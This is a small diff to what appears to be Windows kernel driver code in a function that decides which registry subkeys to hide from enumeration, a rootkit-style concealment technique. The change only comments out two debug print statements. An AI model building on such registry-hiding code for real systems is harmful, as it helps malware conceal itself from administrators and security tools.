@@ -57,7 +57,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
         return status;
     }
 
-    kprintf("[+] RegistryKeyHideInformation: ZwQueryKey subkeys count: %d.\n", keyInfo->SubKeys);
+    //kprintf("[+] RegistryKeyHideInformation: ZwQueryKey subkeys count: %d.\n", keyInfo->SubKeys);
     ULONG SubKeysCount = keyInfo->SubKeys;
     ExFreePool(keyInfo);
     
@@ -106,7 +106,7 @@ NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubk
                 *HideSubkeyIndexesCount += 1;
             }
             else {
-                kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
+                //kprintf("[+] RegistryKeyHideInformation: subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
                 (*OkSubkeyIndexes)[*OkSubkeyIndexesCount] = KeyIndex;
                 *OkSubkeyIndexesCount += 1;
             }
